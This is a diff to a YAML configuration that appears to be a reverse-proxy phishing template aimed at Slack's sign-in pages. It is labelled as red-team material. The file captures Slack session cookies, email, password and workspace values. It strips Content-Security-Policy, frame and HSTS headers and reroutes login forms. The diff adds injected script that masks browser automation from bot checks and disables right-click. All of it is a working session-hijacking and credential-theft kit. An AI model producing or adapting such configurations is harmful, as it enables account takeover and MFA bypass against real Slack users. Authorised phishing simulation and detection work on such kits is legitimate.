@@ -1,23 +1,39 @@
 name: "Slack-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "slack"
     target: "slack.com"
-auth_urls: ["/signin"]
-landing_path: ["/signin"]
+  - subdomain: "app"
+    target: "app.slack.com"
+auth_urls: 
+  - "/signin"
+  - "/auth/signin"
+landing_path: 
+  - "/signin"
 auth_tokens:
   - {type: "cookie", name: "d"}
   - {type: "cookie", name: "d-s"}
   - {type: "cookie", name: "b"}
+  - {type: "cookie", name: "x"}
 credentials:
   - {type: "post_param", name: "email", regex: null}
   - {type: "post_param", name: "password", regex: null}
   - {type: "post_param", name: "domain", regex: null}
-injections: []
+injections:
+  - trigger_path: "/signin"
+    position: "body_end"
+    content: |
+      (function(){
+        // Slack Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
 cookie_rewrites: []
@@ -25,3 +41,5 @@ blocklist:
   - {pattern: "analytics|/track|/stats|/beacon", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/api/signin"}
+bridges:
+  - {prefix: "/_app/", target_host: "app.slack.com", strip_prefix: true, cors: "allow_all"}
